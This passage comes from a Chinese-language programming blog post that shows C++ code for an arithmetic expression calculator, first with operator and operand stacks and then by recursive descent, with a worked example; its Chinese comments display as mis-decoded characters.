class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isValidOperator</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//cæ˜¯å¦ä¸ºåˆæ³•è¿ç®—ç¬¦</span></span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:<span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">canPushOperator</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//åˆ¤æ–­æ˜¯å¦å¯ä»¥å‹ç¬¦å·æ ˆ</span></span><br><span class="line">    <span class="keyword">if</span>(operators.empty()||icp(c)&gt;isp(operators.top()))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">matchBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//åˆ¤æ–­æ˜¯å¦åŒ¹é…æ‹¬å·</span></span><br><span class="line">    <span class="keyword">return</span> !operators.empty()&amp;&amp;isp(operators.top())==icp(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">getTwoOperands</span><span class="params">(<span class="type">double</span> &amp;first,<span class="type">double</span> &amp;second)</span>&#123;<span class="comment">//å–å¾—æ“ä½œæ•°æ ˆé¡¶ä¸¤ä¸ª</span></span><br><span class="line">    <span class="keyword">if</span>(operands.size()&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        Invalid=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    first=operands.top();</span><br><span class="line">    operands.pop();</span><br><span class="line">    second=operands.top();</span><br><span class="line">    operands.pop();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">aftermath</span><span class="params">()</span>&#123;<span class="comment">//æ‰«æå®Œæ¯•,å¤„ç†åäº‹</span></span><br><span class="line">    <span class="type">double</span> first,second;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">    <span class="keyword">while</span>(!operators.empty())&#123;<span class="comment">//æ¯æ¬¡å¼¹ä¸€ä¸ªç¬¦å·,ä¸¤ä¸ªæ•°,è®¡ç®—ä¹‹åç»“æœå†å‹å›æ“ä½œæ•°æ ˆ</span></span><br><span class="line">        op=operators.top();</span><br><span class="line">        operators.pop();</span><br><span class="line">        <span class="keyword">if</span>(!getTwoOperands(first,second))&#123;</span><br><span class="line">            Invalid=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        operands.push(basic_operate(op,first,second));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> operands.top();<span class="comment">//åˆ°æœ€åå¦‚æœæ— è¯¯,ç¬¦å·æ ˆåº”è¯¥å¼¹ç©º,æ“ä½œæ•°åªå‰©ä¸€ä¸ªæ ˆé¡¶,å°±æ˜¯æœ€ç»ˆç»“æœ</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;err)</span>&#123;</span><br><span class="line">    <span class="built_in">cerr</span>&lt;&lt;<span class="string">&quot;error:&quot;</span>&lt;&lt;err&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">evalExpression</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;expression)</span>&#123;</span><br><span class="line">    <span class="built_in">string</span> buffer;<span class="comment">//æ“ä½œæ•°è½¬æ¢ç¼“å†²åŒº</span></span><br><span class="line">    <span class="type">double</span> digit;</span><br><span class="line">    <span class="type">bool</span> digit_flag=<span class="number">0</span>;<span class="comment">//è¿ç»­å–æ“ä½œæ•°å¼€å…³</span></span><br><span class="line">    <span class="type">double</span> first,second;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line">    <span class="type">double</span> result;</span><br><span class="line">    <span class="type">int</span> length=expression.length();</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;length;++i)&#123;</span><br><span class="line">        c=expression[i];</span><br><span class="line">        <span class="keyword">if</span>(isDigit(c))&#123;</span><br><span class="line">            <span class="keyword">if</span>(digit_flag==<span class="literal">false</span>)&#123;</span><br><span class="line">                digit_flag=<span class="literal">true</span>;</span><br><span class="line">                buffer=c;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> buffer+=c;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;actived&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!isValidOperator(c))&#123;</span><br><span class="line">            error(<span class="string">&quot;inValidOperator&quot;</span>);</span><br><span class="line">            Invalid=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(digit_flag==<span class="literal">true</span>)&#123;</span><br><span class="line">            digit_flag=<span class="literal">false</span>;</span><br><span class="line">            digit=stod(buffer);</span><br><span class="line">            operands.push(digit);</span><br><span class="line">            buffer=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(canPushOperator(c))&#123;</span><br><span class="line">            operators.push(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(matchBracket(c))&#123;</span><br><span class="line">            operators.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            op=operators.top();</span><br><span class="line">            operators.pop();</span><br><span class="line">            <span class="keyword">if</span>(!getTwoOperands(first,second))&#123;</span><br><span class="line">                error(<span class="string">&quot;lack of operands&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            operands.push(basic_operate(op,first,second));</span><br><span class="line">            --i;<span class="comment">//å›æº¯,cé‡æ–°ä¸ç¬¦å·æ ˆé¡¶è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ‰«æå®Œæ¯•,ä½†æ˜¯å¦‚æœæœ€åæ˜¯ä¸€ä¸ªæ“ä½œæ•°,å®ƒæ­¤æ—¶è¿˜ç•™åœ¨bufferç¼“å†²åŒºä¸­,éœ€è¦å‹æ ˆ</span></span><br><span class="line">    <span class="keyword">if</span>(digit_flag==<span class="literal">true</span>)&#123;</span><br><span class="line">        digit=stod(buffer);</span><br><span class="line">        operands.push(digit);</span><br><span class="line">        digit_flag=<span class="literal">false</span>;</span><br><span class="line">        buffer=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    result=aftermath();<span class="comment">//å¤„ç†åäº‹,é‡è¦</span></span><br><span class="line">    <span class="keyword">if</span>(Invalid)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">calc</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>&#123;</span><br><span class="line">    <span class="built_in">string</span> expression=removeBlank(str);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;expression&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="type">double</span> result=evalExpression(expression);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">string</span> text=<span class="string">&quot;1+2*3*4+(1+2)*3&quot;</span>;</span><br><span class="line">    <span class="type">double</span> result=calc(text);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;result;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="é€’å½’ä¸‹é™ç®—æ³•">é€’å½’ä¸‹é™ç®—æ³•</h3>
<p>ä¸‰ä¸ªå‡½æ•°,åˆ†æˆä¸‰å±‚</p>
<p>æœ€é«˜å±‚,å°†æ•´ä¸ªè¡¨è¾¾å¼çœ‹æˆè‹¥å¹²é¡¹çš„å’Œå·®,ç»´æŠ¤ä¸€ä¸ªresult,ä»å·¦åˆ°å³ç´¯åŠ å„é¡¹çš„å’Œå·®.æ¯ä¸€é¡¹éƒ½è¦æ‰”ç»™ä¸­é—´å±‚å‡½æ•°è¿›è¡Œè®¡ç®—</p>
<p>ä¸­é—´å±‚,å°†æœ€é«˜å±‚ç»™çš„æ¯ä¸€é¡¹éƒ½è§†ä¸ºä¸€ä¸ªç§¯å¼,ç»´æŠ¤ä¸€ä¸ªresult,ä»å·¦åˆ°å³ç´¯ä¹˜å„é¡¹çš„ç§¯å•†.æ¯ä¸€é¡¹éƒ½è¦æ‰”ç»™åº•å±‚å‡½æ•°è¿›è¡Œè®¡ç®—</p>
<p>æœ€åº•å±‚,å°†ä¸­é—´å±‚ç»™çš„æ¯ä¸€é¡¹éƒ½è§†ä¸ºä¸€ä¸ªæ•°æˆ–è€…ä¸€ä¸ªæ‹¬å·.æ ¹æ®æ˜¯å¦æœ‰å·¦æ‹¬å·è¿›è¡ŒåŒºåˆ†.å¯¹äºæ•°å°±å­—ç¬¦ä¸²è½¬æ•°ç„¶åè¿”å›äº†,å¯¹äºæ‹¬å·åˆ™å°†æ‹¬å·é‡Œçš„è¡¨è¾¾å¼è§†ä¸ºä¸€ä¸ªé¡¶å±‚å’Œå·®å¼,æ‰”ç»™æœ€é«˜å±‚</p>
<blockquote>
<p>æ¯”å¦‚<code>expression=1+(2+3)*4-5</code></p>
<p>æœ€é«˜å±‚evalExpressionä¼šå°†è¿™ä¸ªè¡¨è¾¾å¼æ‹†åˆ†æˆè‹¥å¹²termçš„ç§¯</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">evalExpression(expression):</span><br><span class="line">	<span class="keyword">return</span> evalTerm(term1)+evalTerm(term2)-evalTerm(term3)</span><br><span class="line">    	<span class="comment">//term1=1</span></span><br><span class="line">    	<span class="comment">//term2=(2+3)*4</span></span><br><span class="line">    	<span class="comment">//term3=5</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åæ¯ä¸ªterméƒ½ä¼šå¾€ä¸‹æ‰”,ç”©é”…ç»™ä¸­å±‚å‡½æ•°evalTerm,å…¶ä¸­term2å…·æœ‰ä»£è¡¨æ€§</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evalTerm(term2):</span><br><span class="line">	<span class="keyword">return</span> evalFactor(factor1)*evalFactor(factor2)</span><br><span class="line">	<span class="comment">//factor1=(2+3)</span></span><br><span class="line">	<span class="comment">//factor2=4</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åæ¯ä¸ªfactoråˆä¼šå¾€ä¸‹æ‰”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evalFactor((<span class="number">2</span>+<span class="number">3</span>)):</span><br><span class="line">	<span class="keyword">return</span> evalExpression(<span class="number">2</span>+<span class="number">3</span>)<span class="comment">//æˆ‘çš„å¤©å‘,åº•å±‚å·¥å…·äººå„¿ä¹Ÿæœ‰æŒ‡ä½¿é¡¶å±‚äººä¸Šäººå„¿çš„ä¸€å¤©?</span></span><br><span class="line">evalFactor(<span class="number">4</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>åº•å±‚å·¥å…·äººå„¿evalFactorç®—å®Œäº†ä¸­å±‚å·¥å…·äººå„¿evalTermçš„ä»»åŠ¡ä¹‹å,æŠŠå€¼äº¤ç»™ä¸­å±‚å·¥å…·äººå„¿</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evalTerm(term2):</span><br><span class="line">	<span class="keyword">return</span> <span class="number">5</span>*<span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>ä¸­å±‚å·¥å…·äººå„¿evalTermç®—å®Œäº†ä¹‹åæŠŠå€¼äº¤ç»™é¡¶å±‚äººä¸Šäººå„¿evalExpression</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evalExpression(expression):</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>+<span class="number">20</span><span class="number">-5</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æ­¤æ•´ä¸ªè¡¨è¾¾å¼å°±æ±‚å®Œäº†</p>
</blockquote>
<p>å®Œæ•´ç¨‹åº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> Invalid;<span class="comment">//æ¨¡å—å…¨å±€å˜é‡,å¤±æ•ˆæ ‡è®°,è¿›è¡Œæ–°çš„è®¡ç®—ä¹‹å‰é¦–å…ˆåº”è¯¥æ£€æŸ¥æ˜¯å¦å¤±æ•ˆ,å¤±æ•ˆåˆ™å¯ä»¥å·æ‡’äº†</span></span><br><span class="line"><span class="type">int</span> pos;<span class="comment">//expression[pos],å½“å‰æ‰«æä½ç½®,å®æ—¶åç§»</span></span><br><span class="line"><span class="built_in">string</span> expression;<span class="comment">//è¡¨è¾¾å¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///é€’å½’ä¸‹é™æ±‚è§£è¡¨è¾¾å¼</span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">calc</span><span class="params">()</span>;<span class="comment">//è®¡ç®—å™¨</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">evalExpression</span><span class="params">()</span>;<span class="comment">//å°†strè§†ä¸ºè‹¥å¹²é¡¹çš„å’Œå·®</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">evalTerm</span><span class="params">()</span>;<span class="comment">//å°†strè§†ä¸ºè‹¥å¹²é¡¹çš„ç§¯å•†</span></span><br><span class="line"><span class="type">double</span> <span class="title function_">evalFactor</span><span class="params">()</span>;<span class="comment">//å°†strè§†ä¸ºå•ä¸ªé¡¹æˆ–è€…ä¸€ä¸ªæ‹¬å·è¡¨è¾¾å¼</span></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">removeBlank</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>;<span class="comment">//å»é™¤è¾“å…¥è¡¨è¾¾å¼ä¸­çš„ç©ºæ ¼</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEnd</span><span class="params">()</span>&#123;<span class="comment">//æ£€æŸ¥æ˜¯å¦æ‰«æå®Œæ¯•</span></span><br><span class="line">    <span class="keyword">return</span> expression[pos]==<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isAdd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;+&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isMinus</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;-&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLevel1</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//æ˜¯å¦æ˜¯é¡¶å±‚äººä¸Šäººå„¿çš„å·¥ä½œ</span></span><br><span class="line">    <span class="keyword">return</span> isAdd(c)||isMinus(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isMultiply</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;*&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isDivide</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLevel2</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;<span class="comment">//æ˜¯å¦æ˜¯ä¸­å±‚å·¥å…·äººå„¿çš„å·¥ä½œ</span></span><br><span class="line">    <span class="keyword">return</span> isDivide(c)||isMultiply(c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isLeftBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isRightBracket</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isDigit</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;c&lt;=<span class="string">&#x27;9&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isDot</span><span class="params">(<span class="type">const</span> <span class="type">char</span> &amp;c)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> c==<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">removeBlank</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>&#123;<span class="comment">//å»é™¤strä¸­çš„ç©ºæ ¼</span></span><br><span class="line">    <span class="built_in">string</span> expression;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> c:str)&#123;</span><br><span class="line">        <span class="keyword">if</span>(c!=<span class="string">&#x27; &#x27;</span>)&#123;<span class="comment">//æ’é™¤ç©ºæ ¼</span></span><br><span class="line">            expression+=c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> expression;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="title function_">calc</span><span class="params">(<span class="type">const</span> <span class="built_in">string</span> &amp;str)</span>&#123;</span><br><span class="line">    pos=<span class="number">0</span>;<span class="comment">//å¤ä½</span></span><br><span class="line">    Invalid=<span class="number">0</span>;</span><br><span class="line">    expression=removeBlank(str);</span><br><span class="line">    <span class="type">double</span> result=evalExpression();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">evalExpression</span><span class="params">()</span>&#123;<span class="comment">//é¡¶å±‚äººä¸Šäººå„¿</span></span><br><span class="line">    <span class="type">double</span> result=<span class="number">0</span>;<span class="comment">//ç´¯åŠ å’Œ</span></span><br><span class="line">    <span class="type">double</span> term;<span class="comment">//termè¡¨ç¤ºä¸€ä¸ª&quot;åŠ æ•°&quot;</span></span><br><span class="line">    <span class="type">char</span> op;<span class="comment">//å­˜æ”¾ä¸€ä¸ªè¿ç®—ç¬¦</span></span><br><span class="line">    </span><br><span class="line">    term=evalTerm();<span class="comment">//æœ€å·¦è¾¹åº”è¯¥æ˜¯ä¸€ä¸ªå€¼,ä¸åº”è¯¥æ˜¯ä¸€ä¸ªè¿ç®—ç¬¦(è´Ÿå·ä¹Ÿç®—æ˜¯æ•°çš„ä¸€éƒ¨åˆ†)</span></span><br><span class="line">    <span class="keyword">if</span>(Invalid)&#123;<span class="comment">//æ£€æŸ¥evalTermå‡½æ•°æ˜¯å¦æŠ¥é”™</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result+=term;<span class="comment">//å¦‚æœæ²¡æœ‰æŠ¥é”™å°±å¯ä»¥ç´¯åŠ äº†</span></span><br><span class="line">    <span class="keyword">while</span>(!isEnd())&#123;<span class="comment">//ä»å·¦å‘å³æ‰«æ,æœ€å®½æ³›çš„åœæ­¢èŒƒå›´å°±æ˜¯æ‰«æåˆ°å¤´äº†</span></span><br><span class="line">        op=expression[pos];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!isLevel1(op))&#123;<span class="comment">//å¦‚æœå°†å„é¡¹éƒ½è§†ä¸ºå› æ•°ä¹‹å,è¿˜æ˜¯é‡åˆ°äº†éé¡¶å±‚è¿ç®—ç¬¦,æ¯”å¦‚æ‹¬å·,å°±åº”è¯¥è¿”å›ç»“æœäº†</span></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;<span class="comment">//æ‰§è¡Œåˆ°æ­¤è¯´æ˜opæ˜¯é¡¶å±‚çš„è¿ç®—ç¬¦,å³åŠ æˆ–è€…å‡æ³•</span></span><br><span class="line">        term=evalTerm();<span class="comment">//posåç§»è¶Šè¿‡äº†op,ä¸‹ä¸€ä¸ªç†è®ºä¸Šå°±åº”è¯¥æ˜¯ä¸€ä¸ªå’Œå¼</span></span><br><span class="line">        <span class="keyword">if</span>(Invalid)&#123;<span class="comment">//æ£€æŸ¥evalTermæ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(isAdd(op))&#123;<span class="comment">//æ ¹æ®opæ˜¯åŠ æˆ–è€…å‡å†³å®šåˆšç®—å‡ºçš„termå¦‚ä½•ç´¯è®¡åˆ°resultä¸Š</span></span><br><span class="line">            result+=term;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(isMinus(op))&#123;</span><br><span class="line">            result-=term;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">double</span> <span class="title function_">evalTerm</span><span class="params">()</span>&#123;<span class="comment">//ä¸­å±‚å·¥å…·äººå„¿,é€»è¾‘ä¸evalExpressionå‡ ä¹ç›¸åŒ</span></span><br><span class="line">    <span class="type">double</span> result=<span class="number">1</span>;</span><br><span class="line">    <span class="type">double</span> factor;</span><br><span class="line">    <span class="type">char</span> op;</span><br><span class="line"></span><br><span class="line">    factor=evalFactor();</span><br><span class="line">    <span class="keyword">if</span>(Invalid)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result*=factor;</span><br><span class="line">    <span class="keyword">while</span>(!isEnd())&#123;</span><br><span class="line">        op=expression[pos];</span><br><span class="line">        <span class="keyword">if</span>(!isLevel2(op))&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        ++pos;</span><br><span class="line">        factor=evalFactor();</span><br><span class="line">        <span class="keyword">if</span>(Invalid)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(isMultiply(op))&#123;</span><br><span class="line">            